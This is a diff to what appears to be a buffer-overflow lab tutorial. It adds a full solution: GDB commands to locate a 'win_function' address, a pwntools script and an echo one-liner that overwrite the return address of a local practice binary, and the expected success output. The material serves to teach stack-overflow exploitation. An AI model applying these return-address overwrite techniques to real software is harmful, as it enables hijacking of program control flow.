@@ -201,7 +201,62 @@ if __name__ == "__main__":
 
 ```
 
-When you run the exploit, you should see the success message defined in the `target_function` in the program's output. This means you have successfully taken control of the program's flow.
+## Complete Solution (Finding Addresses with GDB)
+
+### 1. Finding Addresses with GDB
+
+```bash
+# Open binary with GDB
+gdb ./compiled/vulnerable_code
+
+# Find function addresses
+(gdb) info functions
+(gdb) info functions win_function
+(gdb) x/gx win_function
+
+# Test buffer overflow
+(gdb) break vulnerable_function
+(gdb) run
+(gdb) x/32gx $rsp
+(gdb) continue
+```
+
+### 2. Creating Buffer Overflow Exploit
+
+```python
+from pwn import *
+
+# Buffer size and offset calculation
+BUFFER_SIZE = 64
+RETURN_ADDR_OFFSET = 72  # RBP + 8 bytes
+
+# Get win_function address from GDB
+win_addr = 0x401146  # Example address
+
+# Create payload
+payload = b"A" * RETURN_ADDR_OFFSET  # Buffer overflow
+payload += p64(win_addr)  # Return address overwrite
+
+# Run exploit
+p = process("./compiled/vulnerable_code")
+p.sendline(payload)
+p.interactive()
+```
+
+### 3. Manual Test
+
+```bash
+# Test with hex payload
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code
+```
+
+### 4. Expected Result
+
+```
+--- Zafiyet Basariyla Somuruldu! ---
+```
+
+When you run the exploit, you should see the success message defined in the `win_function` in the program's output. This means you have successfully taken control of the program's flow.
 
 ## Linux Compatibility
 
